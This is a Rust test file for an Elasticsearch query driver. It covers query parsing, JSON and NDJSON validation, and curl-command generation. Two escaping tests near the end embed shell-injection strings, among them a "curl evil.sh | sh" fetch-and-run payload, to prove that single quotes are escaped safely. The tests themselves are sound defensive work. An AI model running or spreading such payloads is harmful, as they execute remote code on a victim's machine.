use super::*;

#[test]
fn parse_query_splits_method_path_and_body() {
    let (method, path, body) =
        parse_query("POST my-index/_search\n{\"query\": {\"match_all\": {}}}").unwrap();

    assert_eq!(method, "POST");
    assert_eq!(path, "my-index/_search");
    assert_eq!(body.as_deref(), Some("{\"query\": {\"match_all\": {}}}"));
}

#[test]
fn parse_query_ignores_hash_line_and_block_comments_like_kibana() {
    let (method, path, body) = parse_query(
        "# find recent\nPOST my-index/_search\n{\n  // \"size\": 5,\n  \"query\": {\"match_all\": {}}, /* all */\n  # \"sort\": []\n  \"note\": \"see http://x/y # not a comment\"\n}",
    )
    .unwrap();

    assert_eq!(method, "POST");
    assert_eq!(path, "my-index/_search");
    let parsed: serde_json::Value = serde_json::from_str(&body.unwrap()).unwrap();
    assert_eq!(
        parsed,
        serde_json::json!({"query": {"match_all": {}}, "note": "see http://x/y # not a comment"})
    );
}

#[test]
fn a_double_slash_in_the_request_path_is_not_a_comment() {
    let (_, path, _) = parse_query("GET a//b/_search\n{}").unwrap();
    assert_eq!(path, "a//b/_search");
}

#[test]
fn parse_query_allows_a_missing_body() {
    let (method, path, body) = parse_query("GET _cat/indices?v").unwrap();

    assert_eq!(method, "GET");
    assert_eq!(path, "_cat/indices?v");
    assert_eq!(body, None);
}

#[test]
fn parse_query_rejects_a_missing_path() {
    assert!(parse_query("GET").is_none());
}

#[test]
fn edit_sql_set_values_merges_dotted_paths_under_one_parent() {
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");
    let edit = query_driver::RowEdit {
        table: "my-index".to_string(),
        key: vec![("_id".to_string(), "1".to_string())],
        change: query_driver::RowChange::SetValues(vec![
            ("customer.name".to_string(), "Ada".to_string()),
            ("customer.vip".to_string(), "true".to_string()),
            ("views".to_string(), "9".to_string()),
        ]),
    };

    let statement = driver.edit_sql(&edit).unwrap();
    let (method, path, body) = parse_query(&statement).unwrap();
    assert_eq!(method, "POST");
    assert_eq!(path, "my-index/_update/1?refresh=true");
    let body: serde_json::Value = serde_json::from_str(&body.unwrap()).unwrap();
    assert_eq!(
        body,
        serde_json::json!({"doc": {"customer": {"name": "Ada", "vip": true}, "views": 9}})
    );
}

#[test]
fn validate_json_body_accepts_a_single_json_object() {
    assert_eq!(
        validate_json_body(r#"{"query": {"match_all": {}}}"#),
        Ok(())
    );
}

#[test]
fn validate_json_body_accepts_ndjson_for_bulk_and_msearch() {
    let bulk = "{\"index\": {\"_index\": \"my-index\"}}\n{\"field\": \"value\"}";
    assert_eq!(validate_json_body(bulk), Ok(()));
}

#[test]
fn validate_json_body_accepts_ndjson_with_blank_lines_between_entries() {
    let bulk = "{\"index\": {}}\n\n{\"field\": \"value\"}\n";
    assert_eq!(validate_json_body(bulk), Ok(()));
}

#[test]
fn validate_json_body_rejects_a_malformed_single_object() {
    assert!(validate_json_body(r#"{"query": {"match_all": {}}"#).is_err());
}

#[test]
fn validate_json_body_rejects_ndjson_with_one_bad_line() {
    let bulk = "{\"index\": {}}\n{not json}";
    assert!(validate_json_body(bulk).is_err());
}

#[tokio::test]
async fn execute_accepts_an_ndjson_bulk_body_rather_than_rejecting_it_as_invalid_json() {
    // Same unroutable-host trick as the test below: if this reached
    // `request.send()` it's proof the NDJSON body passed local
    // validation (a connection-refused/timeout error here, not
    // "invalid JSON body").
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    let err = driver
        .execute("POST _bulk\n{\"index\": {\"_index\": \"my-index\"}}\n{\"field\": \"value\"}")
        .await
        .unwrap_err();

    assert!(
        !err.to_string().contains("invalid JSON body"),
        "a valid NDJSON bulk body must not be rejected as malformed JSON, got: {err}"
    );
}

#[tokio::test]
async fn execute_rejects_malformed_json_locally_without_touching_the_network() {
    // The target host is unroutable (port 1, never a real server) --
    // if this reached `request.send()` it would hang/fail on a
    // connection error instead of the JSON error asserted below, so a
    // network-shaped error here would mean the local validation was
    // skipped, not that it's slow.
    let driver = ElasticsearchDriver::new("http://127.0.0.1:1");

    let err = driver
        .execute("POST my-index/_search\n{\"query\": {\"match_all\": {}}")
        .await
        .unwrap_err();

    assert!(
        err.to_string().contains("invalid JSON body"),
        "expected a local JSON error, got: {err}"
    );
}

#[test]
fn to_curl_includes_the_body_when_present() {
    let curl = to_curl(
        "http://localhost:9200",
        "POST my-index/_search\n{\"query\":{\"match_all\":{}}}",
    )
    .unwrap();

    assert_eq!(
        curl,
        "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}}}'"
    );
}

#[test]
fn to_curl_omits_the_body_flags_when_there_is_no_body() {
    let curl = to_curl("http://localhost:9200", "GET _cat/indices?v").unwrap();

    assert_eq!(curl, "curl -X GET 'http://localhost:9200/_cat/indices?v'");
}

#[test]
fn to_curl_returns_none_for_unparseable_queries() {
    assert!(to_curl("http://localhost:9200", "").is_none());
}

#[test]
fn to_curl_escapes_single_quotes_in_the_body_so_the_shell_command_is_safe() {
    let body = r#"{"query": "'; curl evil.sh | sh; '"}"#;
    let curl = to_curl(
        "http://localhost:9200",
        &format!("POST my-index/_search\n{body}"),
    )
    .unwrap();

    // Every `'` in the body must be replaced with the close-quote /
    // escaped-literal-quote / reopen-quote sequence `'\''`, so the body
    // stays a single shell argument with no early quote-close.
    let expected_escaped_body = r#"{"query": "'\''; curl evil.sh | sh; '\''"}"#;
    assert_eq!(
        curl,
        format!(
            "curl -X POST 'http://localhost:9200/my-index/_search' -H 'Content-Type: application/json' -d '{expected_escaped_body}'"
        )
    );
}

#[test]
fn to_curl_escaped_body_round_trips_through_a_real_shell() {
    let body = r#"{"query": "'; touch /tmp/tradar-to-curl-test-should-not-exist; '"}"#;
    let curl = to_curl(
        "http://localhost:9200",
        &format!("POST my-index/_search\n{body}"),
    )
    .unwrap();

    // Run the generated command through a real shell, replacing `curl`
    // with `echo` so nothing actually hits the network, and assert the
    // shell reconstructs exactly the original (unescaped) body as a
    // single argument — proving the embedded `'; ...; '` never breaks
    // out of the quoted string.
    let script = curl.replacen("curl", "echo", 1);
    let output = std::process::Command::new("sh")
        .arg("-c")
        .arg(&script)
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(
        !std::path::Path::new("/tmp/tradar-to-curl-test-should-not-exist").exists(),
        "the injected `touch` command ran — to_curl produced unsafe shell output: {curl}"
    );
    assert!(
        stdout.contains(body),
        "expected the shell-parsed output to contain the original body verbatim, got: {stdout}"
    );
}
